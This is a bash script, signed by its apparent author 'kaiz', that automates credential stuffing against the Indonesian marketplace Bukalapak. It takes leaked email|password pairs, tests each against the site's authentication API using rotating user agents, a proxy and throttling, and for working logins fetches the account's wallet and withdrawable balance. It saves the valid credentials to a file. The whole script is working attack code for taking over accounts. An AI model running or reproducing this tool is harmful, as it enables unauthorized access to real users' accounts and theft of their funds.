#!/bin/bash
# pwnd by kaiz

cat << "EOF"

		     BukaLapak ?
		  WELCOME TO THE GAME


EOF




	printf "[!] Loading.... \n\n"


ngecek(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
	# local empas="Checking Email: ${1}, Password: ${2}, User Agent:${3}"
	local empas="Email: ${1}, Password: ${2}"
	local ngecek=$(timeout 10 curl -s "https://api.bukalapak.com/v2/authenticate.json" -X POST -A "$3" -D - -u "$1:$2" -x "${4}")
	if [[ $ngecek =~ "Status: 200 OK" ]]; then
		local status=$(echo $ngecek | grep -Po "(?<=\"status\":\")[^\"]*")
		local message=$(echo $ngecek | grep -Po "(?<=\"message\":\")[^\"]*")
		if [[ $status == "OK" ]]; then
			local token=$(echo $ngecek | grep -Po "(?<=\"token\":\")[^\"]*")
			local userid=$(echo $ngecek | grep -Po "(?<=\"user_id\":)[^,]*")
			local getSaldo=$(timeout 10 curl -s -D - "https://api.bukalapak.com/v2/dompet/history.json?per_page=12&page=1" -u ${userid}:${token} -A "${3}")
			if [[ $getSaldo =~ "Status: 200 OK" ]]; then
				local saldo=$(echo $getSaldo | grep -Po "(?<=\"balance\":)[^,]*")
				local wsaldo=$(echo $getSaldo | grep -Po "(?<=\"withdrawable_balance\":)[^,]*")
				printf "${B}${GR}LIVE${CC} | ${empas} => Balance : ${B}${saldo}${CC}, Withdrawable Balance ${B}${wsaldo}${CC}\n"
				echo "${1}|${2} => [Balance : ${saldo}] [Withdrawable Balance ${wsaldo}]" >> live.txt
			else
				printf "${B}${GR}LIVE${CC} | ${empas} =>  Can't Get Data \n"
				echo "${1}|${2} => [Balance : UNK] [Withdrawable Balance UNK]" >> live.txt
			fi
		else
			printf "${B}${RD}DIE${CC} | ${empas} \n"
			echo "${1}|${2}" >> die.txt
		fi
	else
		printf "${B}${CY}UNKNOWN${CC} | ${empas} => Try to check again ...\n"
		ngecek ${1} ${2} "${3}" "${sock}"
	fi
}

persend=4
setleep=1

# CHECK SPECIAL VAR FOR MAILIST
if [[ -z $1 ]]; then
	header
	printf "To Use $0 <mailist.txt> \n"
	exit 1
fi


IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'
itung=1

for (( i = 0; i < ${#mailist[@]}; i++ )); do

	#random user agent
	user_agent_number=$[($RANDOM%13)+1];
	UA=`awk -v r=$user_agent_number ' NR==r {print} ' ua.txt`;

	username="${mailist[$i]}"
	IFS='|' read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
	set_kirik=$(expr $itung % $persend)

    if [[ $set_kirik == 0 && $itung > 0 ]]; then
        sleep $setleep
    fi

   

    ngecek "${email}" "${password}" "${UA}" "${sock}" &
done
wait 

printf "[!] Done ....."